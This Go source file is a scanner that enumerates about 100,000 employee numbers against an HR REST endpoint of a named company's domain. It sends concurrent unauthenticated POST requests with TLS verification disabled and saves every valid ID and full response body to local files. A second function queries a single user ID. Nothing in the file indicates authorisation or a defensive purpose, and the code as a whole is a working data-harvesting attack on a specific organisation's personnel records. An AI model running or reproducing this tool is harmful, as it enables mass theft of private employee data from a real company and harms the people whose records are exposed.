package algorithm

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"path"
	"sync"
)

// 最大并发数控制
const maxConcurrency = 50

// 请求函数
func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}, filename string) {
	defer wg.Done()

	// 控制并发数量
	sem <- struct{}{}
	defer func() { <-sem }()
	// Define the request body (empty JSON data)
	jsonData := []byte(`{}`)
	lastSegment := path.Base(url)
	filename_id := filename + "_id.txt"
	filename_body := filename + "_body.txt"
	// Create a new HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error creating request:", err)
	}

	// Set headers
	req.Header.Set("Host", "it.ofilm.com")
	req.Header.Set("Content-Type", "application/json")

	// Skip HTTPS certificate verification (insecure)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("[!] 请求失败: %s - %s\n", url, err)
		return
	}
	defer resp.Body.Close()

	// 检查状态码并处理响应
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && len(body) > 100 {
		fmt.Printf("[+] 有效 URL: %s\n", url)
		saveToFile(filename_id, lastSegment+"\n")
		saveToFile(filename_body, fmt.Sprintf("Response: %s\n", string(body)))
	}
}

// 将内容追加写入文件
func saveToFile(filename, data string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("[!] 文件写入失败:", err)
		return
	}
	defer file.Close()

	if _, err := file.WriteString(data); err != nil {
		fmt.Println("[!] 写入文件错误:", err)
	}
}

func IworkGet() error {
	var wg sync.WaitGroup
	sem := make(chan struct{}, maxConcurrency) // 控制最大并发数

	// 扫描范围1: NF0000 - NF4000
	for i := 3260; i <= 3270; i++ {
		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/NF%04d", i)
		wg.Add(1)
		filename := "NF0000-NF4000"
		go fetchURL(&wg, url, sem, filename)
	}

	// 扫描范围2: N00000 - N99999
	for i := 0; i <= 99999; i++ {
		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/N%05d", i)
		wg.Add(1)
		filename := "N00000-N99999"
		go fetchURL(&wg, url, sem, filename)
	}

	wg.Wait() // 等待所有 goroutine 完成
	fmt.Println("[*] 扫描完成")
	return nil
}

func IworkSent(user string) error {

	// Define the request URL
	url := "https://it.ofilm.com/hr/hr-ks//rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/" + user

	// Define the request body (empty JSON data)
	jsonData := []byte(`{}`)

	// Create a new HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return nil
	}

	// Set headers
	req.Header.Set("Host", "it.ofilm.com")
	req.Header.Set("Content-Type", "application/json")

	// Skip HTTPS certificate verification (insecure)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Send the request
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return nil
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return nil
	}

	// Print the response status and body
	fmt.Printf("Status Code: %d\n", resp.StatusCode)
	fmt.Printf("Response Body: %s\n", body)
	return nil
}
